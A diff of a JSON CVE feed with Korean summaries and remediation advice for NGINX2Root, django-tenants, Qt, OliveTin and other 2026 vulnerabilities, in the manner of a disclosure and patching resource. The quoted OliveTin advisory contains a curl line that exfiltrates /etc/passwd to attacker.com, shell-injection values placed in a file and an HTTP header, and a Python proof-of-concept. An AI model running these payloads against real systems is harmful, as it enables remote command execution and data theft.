+          "url": "https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities",
+          "title": "Wiz: Unauthenticated Remote Code Execution in NGINX"
+        }
+      ],
+      "cwe": [
+        "CWE-416"
+      ],
+      "description_orig": "NGINX HTTP/2 use-after-free when connection draining closes an active HTTP/2 connection while NGINX connects to an upstream server and worker_connections are exhausted. Affects NGINX Open Source 1.19.7 through 1.31.8; fixed in 1.30.7 / 1.31.9. Part of NGINX2Root.",
+      "published_at": "2026-11-18",
+      "updated_at": "2026-11-19 09:32:09 KST",
+      "analyzed_by": "curated"
+    },
+    {
+      "cve_id": "CVE-2026-121810",
+      "title_ko": "NGINX2Root — NGINX HTTP/3(QUIC) 사용 후 해제 원격 코드 실행 (CVE-2026-121810)",
+      "summary_ko": "CVE-2026-121810은 HTTP/3(QUIC) 연결을 정리하는 과정에서 해제된 메모리를 참조하는 사용 후 해제(CWE-416) 결함입니다. QUIC 스트림 생성과 업스트림 연결 도중 연결이 드레이닝되면 워커가 해제된 메모리를 다시 쓰게 되어, HTTP/3가 켜진 서버에서 인증 없이 원격 코드 실행으로 이어질 수 있습니다. F5는 CVSS 4.0 9.2·CVSS 3.1 8.1로 평가했고 NGINX Open Source 1.25.0~1.31.8, NGINX Plus 37.x 계열이 영향을 받습니다.",
+      "impact_ko": "HTTP/3(QUIC)를 켜고 업스트림으로 프록시하는 구성이 대상입니다. 성공 시 워커 권한 코드 실행·서비스 중단이 가능하며, HTTP/2를 끄는 임시 조치로는 막을 수 없습니다.",
+      "remediation_ko": "① NGINX Open Source 1.30.7·1.31.9 이상, NGINX Plus 37.0.8.1·37.3.0.1 이상으로 업데이트하세요. ② 패치 전 임시 조치로 HTTP/3(QUIC) 리스너를 비활성화하세요(HTTP/2 비활성화로는 막히지 않습니다). ③ SCTP가 필요 없는 호스트는 커널 모듈 자동 로드를 차단(install sctp /bin/false)하고, 컨테이너는 호스트 커널 기준으로 점검하세요. ④ 컨테이너 이미지·Helm 차트·Kubernetes 인그레스 컨트롤러·어플라이언스에 번들된 NGINX까지 자산 목록에 넣고 배포판 백포트 여부를 벤더 공지로 확인하세요. ⑤ 워커 크래시('worker process ... exited on signal')와 비정상 프로세스 생성을 모니터링하세요.",
+      "cvss_score": 9.2,
+      "severity": "CRITICAL",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "F5",
+      "product": "NGINX Open Source / NGINX Plus",
+      "affected_products": [
+        "NGINX Open Source 1.25.0 ~ 1.31.8 (HTTP/3 사용 시)",
+        "NGINX Plus 37.x (HTTP/3 사용 시)"
+      ],
+      "poc_count": 1,
+      "poc_links": [
+        {
+          "name": "Censys-Research/nginx2root",
+          "url": "https://github.com/Censys-Research/nginx2root",
+          "stars": 0,
+          "description": "Censys reproductions of the five nginx2root vulnerabilities"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://www.circl.lu/pub/tr-105/",
+          "title": "CIRCL TR-105 NGINX2ROOT - Remote Code Execution in NGINX and Potential Host Compromise"
+        },
+        {
+          "url": "https://cert.europa.eu/publications/security-advisories/2026-022/",
+          "title": "CERT-EU Security Advisory 2026-022 - Critical vulnerabilities in Nginx"
+        },
+        {
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20261118-nginx2root",
+          "title": "Sophos Advisory: NGINX Vulnerabilities - nginx2root"
+        },
+        {
+          "url": "https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now",
+          "title": "Qualys: NGINX2Root - Five nginx Flaws, Led by CVE-2026-123007"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
+          "title": "The Hacker News: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code"
+        },
+        {
+          "url": "https://lwn.net/Articles/1108362/",
+          "title": "LWN: NGINX2Root - Remote Code Execution vulnerabilities in nginx"
+        },
+        {
+          "url": "https://docs.nginx.com/nginx/releases/",
+          "title": "NGINX Releases (1.30.7 / 1.31.9 보안 릴리스)"
+        }
+      ],
+      "cwe": [
+        "CWE-416"
+      ],
+      "description_orig": "NGINX HTTP/3 (QUIC) use-after-free when a QUIC connection is drained during stream creation and upstream connection. Affects NGINX Open Source 1.25.0 through 1.31.8; fixed in 1.30.7 / 1.31.9. Part of NGINX2Root.",
+      "published_at": "2026-11-18",
+      "updated_at": "2026-11-19 09:32:09 KST",
+      "analyzed_by": "curated"
+    },
+    {
+      "cve_id": "CVE-2026-113425",
+      "title_ko": "NGINX2Root — NGINX 메일 프록시 auth_http 사용 후 해제 원격 코드 실행 (CVE-2026-113425)",
+      "summary_ko": "CVE-2026-113425는 NGINX 메일 프록시(ngx_mail_auth_http_module)에서 auth_http 인증 조회 도중 클라이언트가 연결을 끊을 때 발생하는 사용 후 해제(CWE-416) 결함입니다. proxy on과 auth_http가 설정된 메일 프록시 구성에서 공격자가 인증 조회 중 연결을 끊으면 해제된 메모리를 다시 참조해 워커 크래시와 원격 코드 실행으로 이어질 수 있습니다. 대부분의 웹 전용 배포에는 해당하지 않지만, 메일 프록시로 쓰는 NGINX Open Source 0.5.33~1.31.8은 업데이트가 필요합니다.",
+      "impact_ko": "메일 프록시(IMAP/POP3/SMTP)로 운영 중이고 auth_http 인증 조회를 쓰는 NGINX가 대상입니다. 성공 시 워커 권한 코드 실행으로 메일 인증 경로를 장악할 수 있으며, HTTP/2·HTTP/3 비활성화와 무관합니다.",
+      "remediation_ko": "① NGINX Open Source 1.30.7·1.31.9 이상, NGINX Plus 37.0.8.1·37.3.0.1 이상으로 업데이트하세요. ② 패치 전에는 외부에 노출된 메일 프록시 포트를 최소화하고 auth_http 백엔드 지연·타임아웃을 점검하세요. ③ SCTP가 필요 없는 호스트는 커널 모듈 자동 로드를 차단(install sctp /bin/false)하고, 컨테이너는 호스트 커널 기준으로 점검하세요. ④ 컨테이너 이미지·Helm 차트·Kubernetes 인그레스 컨트롤러·어플라이언스에 번들된 NGINX까지 자산 목록에 넣고 배포판 백포트 여부를 벤더 공지로 확인하세요. ⑤ 워커 크래시('worker process ... exited on signal')와 비정상 프로세스 생성을 모니터링하세요.",
+      "cvss_score": 9.2,
+      "severity": "CRITICAL",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "F5",
+      "product": "NGINX Open Source / NGINX Plus",
+      "affected_products": [
+        "NGINX Open Source 0.5.33 ~ 1.31.8 (mail proxy + auth_http 구성)",
+        "NGINX Plus 37.x (mail proxy + auth_http 구성)"
+      ],
+      "poc_count": 1,
+      "poc_links": [
+        {
+          "name": "Censys-Research/nginx2root",
+          "url": "https://github.com/Censys-Research/nginx2root",
+          "stars": 0,
+          "description": "Censys reproductions of the five nginx2root vulnerabilities"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://www.circl.lu/pub/tr-105/",
+          "title": "CIRCL TR-105 NGINX2ROOT - Remote Code Execution in NGINX and Potential Host Compromise"
+        },
+        {
+          "url": "https://cert.europa.eu/publications/security-advisories/2026-022/",
+          "title": "CERT-EU Security Advisory 2026-022 - Critical vulnerabilities in Nginx"
+        },
+        {
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20261118-nginx2root",
+          "title": "Sophos Advisory: NGINX Vulnerabilities - nginx2root"
+        },
+        {
+          "url": "https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now",
+          "title": "Qualys: NGINX2Root - Five nginx Flaws, Led by CVE-2026-123007"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
+          "title": "The Hacker News: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code"
+        },
+        {
+          "url": "https://lwn.net/Articles/1108362/",
+          "title": "LWN: NGINX2Root - Remote Code Execution vulnerabilities in nginx"
+        },
+        {
+          "url": "https://docs.nginx.com/nginx/releases/",
+          "title": "NGINX Releases (1.30.7 / 1.31.9 보안 릴리스)"
+        }
+      ],
+      "cwe": [
+        "CWE-416"
+      ],
+      "description_orig": "NGINX use-after-free in the mail proxy module when the client closes the connection during the auth_http authentication lookup. Affects NGINX Open Source 0.5.33 through 1.31.8; fixed in 1.30.7 / 1.31.9. Part of NGINX2Root.",
+      "published_at": "2026-11-18",
+      "updated_at": "2026-11-19 09:32:09 KST",
+      "analyzed_by": "curated"
+    },
+    {
       "cve_id": "CVE-2026-130082",
-      "title_ko": "Django-tenants SQL 주입 취약점",
-      "summary_ko": "CVE-2026-130082는 Django-tenants에서 확인된 SQL 주입 취약점입니다. CVSS 8.7점(높음)으로 평가됐습니다.",
-      "impact_ko": "데이터베이스 조회·변조·삭제가 가능해 계정 정보와 주요 데이터가 유출될 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 4.0.1 미만 버전이며, 자산 목록과 대조해 4.0.1 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "django-tenants PostgreSQL SQL 인젝션 취약점",
+      "summary_ko": "django-tenants 4.0.1 미만 버전은 PostgreSQL 백엔드에서 테넌트 스키마 이름이 적절히 이스케이프되지 않아 SQL 인젝션이 발생할 수 있다. 공격자가 스키마 이름을 선택하거나 영향을 줄 수 있으면 따옴표 문자를 주입해 SET search_path 및 CREATE, DROP, ALTER SCHEMA 문에 반영할 수 있다. 그 결과 다른 테넌트 데이터를 읽거나 애플리케이션 DB 사용자 권한으로 SQL을 실행할 수 있다.",
+      "impact_ko": "다른 테넌트의 데이터 노출, DB 사용자 권한으로의 임의 SQL 실행, 데이터 무결성 훼손 가능성이 있다.",
+      "remediation_ko": "① 4.0.1 이상으로 업그레이드하거나 제조사 완화책을 확인하고, ② 테넌트 스키마 이름 입력 검증·이스케이프 등 안전한 식별자 처리를 적용하며, ③ DB 계정 최소 권한과 스키마 생성·변경 권한 제한, 접근 모니터링을 수행한다.",
       "cvss_score": 8.7,
       "severity": "HIGH",
       "epss_score": null,
@@ -5284,14 +5690,14 @@
       "description_orig": "django-tenants 3.4.8 before 4.0.1 contains an SQL injection vulnerability in its PostgreSQL backend that allows attackers to inject SQL through unescaped tenant schema names. Attackers who can choose or influence a schema name can supply quote characters that are interpolated into SET search_path and CREATE, DROP or ALTER SCHEMA statements, letting them read other tenants' data or run SQL as the application's database user.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-17 13:30:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-105925",
-      "title_ko": "Qt 서비스 거부(DoS) 취약점",
-      "summary_ko": "CVE-2026-105925는 Qt에서 확인된 서비스 거부(DoS) 취약점입니다. CVSS 8.2점(높음)으로 평가됐습니다.",
-      "impact_ko": "반복 요청으로 서비스 응답이 멈추거나 지연되어 정상 사용자가 서비스를 이용하지 못합니다.",
-      "remediation_ko": "① 영향 범위는 5.0.0·6.8.10·6.11.3 미만 버전이며, 자산 목록과 대조해 5.0.0·6.8.10·6.11.3 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Qt QXmlSimpleReader 서비스 거부 취약점",
+      "summary_ko": "Qt의 Qt 5 Core Compatibility APIs 모듈(Qt 6) 및 Qt XML 모듈(Qt 5)에 있는 QXmlSimpleReader 클래스에서 서비스 거부 취약점이 확인되었습니다. 영향 버전은 Qt 5.0.0 미만, 6.8.10 미만, 6.11.3 미만 등으로 제시되어 있으며 CWE-776에 해당합니다. CVSS 8.2 HIGH로 평가되었고 KEV에는 등재되지 않았습니다.",
+      "impact_ko": "공격 성공 시 Qt 기반 애플리케이션 또는 XML 처리 경로에서 서비스 거부가 발생할 수 있습니다.",
+      "remediation_ko": "① 영향 버전 사용 여부를 확인하고 벤더가 안내하는 수정 버전으로 업데이트를 적용합니다. ② 인터넷에 노출된 Qt 기반 서비스·애플리케이션을 우선 점검하고 XML 입력 처리 경로를 점검합니다. ③ QXmlSimpleReader 관련 오류·비정상 종료·자원 고갈 징후를 모니터링합니다.",
       "cvss_score": 8.2,
       "severity": "HIGH",
       "epss_score": null,
@@ -5336,7 +5742,7 @@
       "description_orig": "A denial of service vulnerability in the Qt QXmlSimpleReader class of the Qt 5 Core Compatibility APIs module (Qt 6) and the Qt XML module (Qt 5).",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130290",
@@ -5380,10 +5786,10 @@
     },
     {
       "cve_id": "CVE-2026-129703",
-      "title_ko": "vulnerability-lookup 인증 우회 취약점",
-      "summary_ko": "CVE-2026-129703는 vulnerability-lookup에서 확인된 인증 우회 취약점입니다. CVSS 7.8점(높음)으로 평가됐습니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "vulnerability-lookup 피드키·API키 인증 우회 취약점",
+      "summary_ko": "vulnerability-lookup 웹 애플리케이션에서 피드키 요청용 auth_feedkey_func와 API키 요청용 auth_func가 Flask-Login의 login_user()를 호출했습니다. 그 결과 X-FEED-KEY URL 파라미터 또는 X-API-KEY 헤더만으로 인증된 요청이 비밀번호나 2단계 인증 없이 모든 페이지에 대한 인증 세션 쿠키를 설정할 수 있었습니다. 유출된 피드 URL이나 API 키를 가진 공격자는 계정 페이지와 API 키·프로필 데이터에 접근할 수 있는 유효한 웹 세션을 얻을 수 있습니다.",
+      "impact_ko": "공격 성공 시 비밀번호·2단계 인증 없이 계정 페이지에 접근하고 API 키 및 프로필 데이터가 노출되며, 해당 API 키가 추가 악용될 수 있습니다.",
+      "remediation_ko": "① 벤더 보안 권고와 패치를 확인하고 취약 버전 사용 중단 또는 업데이트 ② 피드 URL·API 키 노출 여부를 점검하고 유출 의심 키는 즉시 교체·폐기 ③ 인터넷 노출 인스턴스의 인증·세션 설정과 접근 로그를 우선 점검",
       "cvss_score": 7.8,
       "severity": "HIGH",
       "epss_score": null,
@@ -5413,14 +5819,14 @@
       "description_orig": "In the vulnerability-lookup web application, the authentication decorators for feed-key requests (auth_feedkey_func in website/decorators.py) and API-key requests (auth_func in website/web/api/v1/common.py) called Flask-Login's login_user() function. This caused the HTTP response to a request authenticated solely by a feed key (supplied as the X-FEED-KEY URL parameter) or an API key (supplied as the X-API-KEY header) to set a session cookie that grants full authenticated access to every page in the application, without requiring a password or two-factor authentication. The practical impact is that any party possessing a leaked feed URL (a common occurrence, as feed URLs are shared with RSS readers) or an API key could obtain a valid web session for the associated account. This session provides access to the user's account page, which exposes the API key and other profile data, and for accounts with the administrator role, access to the /admin interface, enabling full administrative control of the application. The vulnerability affects all users whose feed key or API key is exposed. No prior authentication, user interaction, or special network conditions are required; a single HTTP request with the token is sufficient to establish the session. The session persists until it expires, and because it is not bound to the original credential (a related CWE-613 issue noted by the developers), revoking the feed key or API key does not invalidate the already-created session. The fix replaces the login_user() call with assignment to g._login_user, which Flask-Login's current_user property reads for the current request only, without writing any session cookie. The affected views remain unchanged and continue to see the authenticated user for the single request.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-124672",
-      "title_ko": "Burst Statistics 보안 취약점",
-      "summary_ko": "CVE-2026-124672는 Burst Statistics에서 확인된 보안 취약점입니다. CVSS 7.3점(높음)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 3.7.5 미만 버전이며, 자산 목록과 대조해 3.7.5 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Burst Statistics REST 라우팅 검증 누락 취약점",
+      "summary_ko": "Burst Statistics 3.7.5 이전 버전은 요청이 실제로 자신의 REST API로 라우팅되는지 검증하지 않는다. 검증 누락 상태에서 해당 요청마다 다른 모든 활성 플러그인을 언로드할 수 있어, 비인증 공격자가 다른 플러그인의 REST 접근 제한, 숨겨진 로그인 페이지, 2단계 인증 같은 보호를 끈 상태로 요청을 처리하게 할 수 있다. 또한 다른 플러그인의 예약 작업이 폐기될 수 있다.",
+      "impact_ko": "공격 성공 시 다른 플러그인의 보안 보호가 우회되거나 예약 작업이 중단되어 사이트 보안 구성과 기능 일정이 영향받을 수 있다.",
+      "remediation_ko": "① Burst Statistics를 3.7.5 이상으로 업데이트하고, ② REST API 라우팅 검증을 적용하며 요청별 플러그인 언로드를 제거·최소화하고, ③ 인터넷 노출 사이트와 비정상 플러그인 비활성화·예약 작업 중단 여부를 점검한다.",
       "cvss_score": 7.3,
       "severity": "HIGH",
       "epss_score": null,
@@ -5447,7 +5853,7 @@
       "description_orig": "The Burst Statistics WordPress plugin before 3.7.5 does not verify that a request is actually being routed to its own REST API before unloading every other active plugin for that request, allowing unauthenticated attackers to have requests processed with other plugins' protections (such as REST access restrictions, hidden login pages and two-factor authentication) switched off, and to cause other plugins' scheduled tasks to be discarded.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130080",
@@ -5499,10 +5905,10 @@
     },
     {
       "cve_id": "CVE-2026-129606",
-      "title_ko": "Samsung Open Source mTower 메모리 손상 취약점",
-      "summary_ko": "CVE-2026-129606는 Samsung Open Source mTower에서 확인된 메모리 손상 취약점입니다. CVSS 7.1점(높음)으로 평가됐습니다.",
-      "impact_ko": "메모리 오류를 악용해 서비스가 중단되거나 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Samsung Open Source mTower 버퍼 오버플로 취약점",
+      "summary_ko": "Samsung Open Source mTower의 특정 리비전(d71301dffba17024a697267bce7c0bbe3dfdeaed)에는 입력 크기 확인 없는 버퍼 복사 취약점이 존재한다. 이는 CWE-120(Classic Buffer Overflow)로 분류되며 CVSS 7.1(HIGH)로 표시된다. 해당 취약점은 버퍼 오버플로를 유발할 수 있어 입력 처리 경로의 검증 부재가 핵심 문제다.",
+      "impact_ko": "공격 성공 시 버퍼 오버플로로 메모리 손상이 발생할 수 있으며, 서비스 중단이나 보안 영향으로 이어질 수 있다.",
+      "remediation_ko": "① 제조사 보안 패치·업데이트를 확인하고 적용하며, ② 해당 리비전 사용 자산을 식별해 격리·점검하고, ③ 인터넷 노출 자산 우선 점검과 입력 크기 검증 강화를 수행한다.",
       "cvss_score": 7.1,
       "severity": "HIGH",
       "epss_score": null,
@@ -5531,7 +5937,7 @@
       "description_orig": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') vulnerability in Samsung Open Source mTower allows Overflow Buffers.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-97358",
@@ -5724,10 +6130,10 @@
     },
     {
       "cve_id": "CVE-2026-75506",
-      "title_ko": "OliveTin 명령어 주입 취약점",
-      "summary_ko": "CVE-2026-75506는 OliveTin에서 확인된 명령어 주입 취약점입니다. CVSS 6.6점(보통)으로 평가됐습니다.",
-      "impact_ko": "조작된 입력으로 서버 명령을 실행할 수 있어 시스템 장악과 데이터 유출로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 3000.18.1 미만 버전이며, 자산 목록과 대조해 3000.18.1 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "OliveTin 후처리 훅 명령어 주입 취약점",
+      "summary_ko": "OliveTin 3000.0.0 이상 3000.18.1 미만에서 shellAfterCompleted 후처리 훅이 output, ot_username, exitCode 등 검증되지 않은 변수를 sh -c 명령 템플릿에 주입한다. 명령 출력에 영향을 줄 수 있는 사용자 입력이나 trusted-header 사용자명 스푸핑이 가능하면 임의 OS 명령 실행으로 이어질 수 있다. 이는 CVE-2026-27626과 별개의 후처리 단계 취약점이다.",
+      "impact_ko": "공격 성공 시 임의 OS 명령 실행이 가능해 시스템 침해, 데이터 유출·변조, 서비스 중단 등으로 이어질 수 있다.",
+      "remediation_ko": "① 영향 버전(>=3000.0.0, <3000.18.1) 사용 여부를 확인하고 공급사 패치에 따라 3000.18.1 이상으로 업데이트한다. ② shellAfterCompleted 훅에서 output, ot_username, exitCode 등 변수 사용 시 검증·이스케이프를 적용하고 sh -c 기반 템플릿 사용을 재검토한다. ③ trusted-header 사용자명 스푸핑 방지를 위해 헤더 신뢰 경계와 인증 설정을 점검하고 인터넷 노출 인스턴스를 우선 점검한다.",
       "cvss_score": 6.6,
       "severity": "MEDIUM",
       "epss_score": null,
@@ -5781,7 +6187,7 @@
       "description_orig": "## Summary OliveTin's `shellAfterCompleted` post-execution hook injects unsanitized variables — including arbitrary command output (`output`), the authenticated username (`ot_username`), and the exit code (`exitCode`) — directly into a shell command template processed by `sh -c`. Unlike the main action's argument handling, **no `checkShellArgumentSafety` validation is applied** to these variables. An attacker who can influence the output of a command (e.g., via user-supplied arguments that reflect in stdout, or through trusted-header username spoofing) can inject arbitrary OS commands into the post-execution shell. This is a **distinct** finding from CVE-2026-27626 (OS command injection via `password` type in webhooks). That CVE addressed argument types bypassing shell safety checks in the primary execution step. This vulnerability exists in the **post-execution step** (`stepExecAfter`), which has **zero** safety checks on any of its template variables. ## Affected Versions - All versions containing `shellAfterCompleted` functionality (current codebase through latest) ## Details ### Vulnerable Code Path In `service/internal/executor/executor.go`, the `stepExecAfter` function handles post-execution commands: ```go func stepExecAfter(req *ExecutionRequest) bool { if req.Binding.Action.ShellAfterCompleted == \"\" { return true } // These variables are injected WITHOUT any type checking or sanitization args := map[string]string{ \"output\": req.logEntry.Output, // Arbitrary command stdout/stderr \"exitCode\": fmt.Sprintf(\"%v\", req.logEntry.ExitCode), \"ot_executionTrackingId\": req.TrackingID, \"ot_username\": req.AuthenticatedUser.Username, // User-controlled via trusted headers } // Template rendered with unsanitized args finalParsedCommand, err := tpl.ParseTemplateWithActionContext( req.Binding.Action.ShellAfterCompleted, req.Binding.Entity, args, ) // Directly passed to sh -c — NO safety check cmd := wrapCommandInShell(ctx, finalParsedCommand) // ... } ``` The `wrapCommandInShell` function (in `executor_unix.go`) executes: ```go func wrapCommandInShell(ctx *ExecutionContext, finalParsedCommand string) *exec.Cmd { return exec.CommandContext(ctx, \"sh\", \"-c\", finalParsedCommand) } ``` ### Why This Bypasses Existing Protections The main action's shell commands go through `checkShellArgumentSafety` (called from `handleShellBranch` at line 693 of executor.go), which blocks dangerous argument types like `password`, `url`, `email`, `raw_string_multiline`, and `very_dangerous_raw_string` from shell mode. **`stepExecAfter` calls none of these checks.** The `output` variable is: - Not a declared argument with a type — it's internally created - Not validated against any regex or type system - Not passed through `checkShellArgumentSafety` - Directly interpolated into a shell command template A `grep` for `checkShellArgumentSafety` in the codebase confirms it is **only** invoked at one location: ``` executor.go:693: if err := checkShellArgumentSafety(req); err != nil { ``` This is inside `handleShellBranch` (the primary action execution), **not** in `stepExecAfter`. ### Injection Vectors #### Vector 1: Output Reflection If a primary action echoes user-controlled input: ```yaml actions: - title: Lookup User shell: \"echo 'User: {{ .Arguments.username }}'\" shellAfterCompleted: \"audit-log '{{ .Arguments.output }}'\" arguments: - name: username type: ascii_identifier ``` While `ascii_identifier` constrains the direct argument, the command output itself is the injection vector. If the action processes external data (files, APIs, databases) and that data contains shell metacharacters, the output flows unsanitized into `shellAfterCompleted`. #### Vector 2: Exec Mode Output Injection Actions using `exec` mode (array form) safely handle arguments in the primary command but the **output** still flows to `shellAfterCompleted` through a shell: ```yaml actions: - title: Read External Data exec: - cat - /shared/data/{{ .Arguments.filename }} shellAfterCompleted: \"process-result '{{ .Arguments.output }}'\" arguments: - name: filename type: ascii_identifier ``` If `/shared/data/report` contains text like: ``` '; curl http://attacker.com/exfil?data=$(cat /etc/passwd) # ``` The `shellAfterCompleted` becomes: ```bash process-result ''; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #' ``` This executes arbitrary commands as the OliveTin process user. #### Vector 3: Username Injection via Trusted Headers When trusted header authentication is used (see Finding 04), the `ot_username` variable comes directly from an HTTP header with no sanitization: ```yaml actions: - title: Any Action shell: \"echo ok\" shellAfterCompleted: \"logger 'Action completed by {{ .Arguments.ot_username }}'\" ``` An attacker sets: ``` X-Remote-User: '; id > /tmp/pwned # ``` The `shellAfterCompleted` becomes: ```bash logger 'Action completed by '; id > /tmp/pwned #' ``` This chains Findings 04 and 05: trusted header spoofing enables username-based injection into post-execution commands. ## PoC ### Prerequisites - OliveTin instance with an action configured with `shellAfterCompleted` - The `shellAfterCompleted` template references `{{ .Arguments.output }}` or `{{ .Arguments.ot_username }}` ### Config ```yaml listenAddressSingleHTTPFrontend: 0.0.0.0:1337 logLevel: \"DEBUG\" checkForUpdates: false actions: - title: Process File id: process-file exec: - cat - \"/tmp/olivetin-data/{{ .Arguments.filename }}\" shellAfterCompleted: \"echo '{{ .Arguments.output }}' >> /tmp/olivetin-audit.log\" arguments: - name: filename type: ascii_identifier ``` ### Step 1: Create a malicious data file ```bash # On the server, create a file with shell injection payload mkdir -p /tmp/olivetin-data echo \"normal_data'; touch /tmp/PWNED; echo '\" > /tmp/olivetin-data/report ``` ### Step 2: Execute the action normally ```bash curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \\ -H 'Content-Type: application/json' \\ -d '{\"bindingId\":\"process-file\",\"arguments\":[{\"name\":\"filename\",\"value\":\"report\"}]}' ``` ### Step 3: Verify injection ```bash ls -la /tmp/PWNED # If the file exists, the injection was successful ``` **Explanation**: The `cat` command (exec mode) safely reads the file. The output `normal_data'; touch /tmp/PWNED; echo '` is captured. Then `shellAfterCompleted` renders: ```bash echo 'normal_data'; touch /tmp/PWNED; echo '' >> /tmp/olivetin-audit.log ``` This executes `touch /tmp/PWNED` as a second command. ### Step 4: Username injection (with trusted headers) ```yaml # Add to config authHttpHeaderUsername: \"X-Remote-User\" ``` ```bash curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \\ -H 'Content-Type: application/json' \\ -H \"X-Remote-User: test'; touch /tmp/PWNED2; echo '\" \\ -d '{\"bindingId\":\"some-action\",\"arguments\":[]}' ``` If `shellAfterCompleted` uses `{{ .Arguments.ot_username }}`, the injection executes. ### Python PoC ```python #!/usr/bin/env python3 \"\"\"PoC: Second-Order Command Injection via shellAfterCompleted output variable. Distinct from CVE-2026-27626 (password type injection in primary execution). This exploits the post-execution step which has zero argument safety checks. \"\"\" import requests import time import os TARGET = \"http://127.0.0.1:1337\" BINDING_ID = \"process-file\" def setup_payload(): \"\"\"Create a data file containing shell injection payload.\"\"\" os.makedirs(\"/tmp/olivetin-data\", exist_ok=True) with open(\"/tmp/olivetin-data/exploit\", \"w\") as f: f.write(\"data'; id > /tmp/rce-proof; echo '\") print(\"[+] Created malicious data file\") def trigger_action(): \"\"\"Execute the action that reads the malicious file.\"\"\" resp = requests.post( f\"{TARGET}/api/StartActionAndWait\", json={ \"bindingId\": BINDING_ID, \"arguments\": [{\"name\": \"filename\", \"value\": \"exploit\"}] }, headers={\"Content-Type\": \"application/json\"} ) print(f\"[+] Action response: {resp.status_code}\") return resp.json() def verify_rce(): \"\"\"Check if the injected command executed.\"\"\" time.sleep(2) if os.path.exists(\"/tmp/rce-proof\"): with open(\"/tmp/rce-proof\") as f: print(f\"[!] RCE CONFIRMED: {f.read().strip()}\") return True else: print(\"[-] /tmp/rce-proof not found\") return False if __name__ == \"__main__\": setup_payload() result = trigger_action() print(f\"[*] Action output: {result}\") verify_rce() ``` ## Impact - **Remote Code Execution**: Arbitrary commands execute as the OliveTin process user - **Chained with Finding 04**: Trusted header spoofing enables injection via `ot_username` - **Bypass of CVE-2026-27626 fix**: The fix for that CVE only addressed `checkShellArgumentSafety` in the primary execution step; the post-execution step was not hardened - **Exec mode bypass**: Actions using the safe `exec` mode (array form) for the primary command can still be exploited through their output flowing to the shell-based `shellAfterCompleted` ## Remediation 1. **Apply `checkShellArgumentSafety`** (or equivalent) to `stepExecAfter` variables 2. **Shell-escape the `output`, `ot_username`, and `exitCode` values** before template substitution (e.g., using `shellescape.Quote()`) 3. **Consider adding an exec-mode variant** for `shellAfterCompleted` to avoid shell interpretation entirely 4. **Sanitize `ot_username`** to reject shell metacharacters regardless of the auth provider",
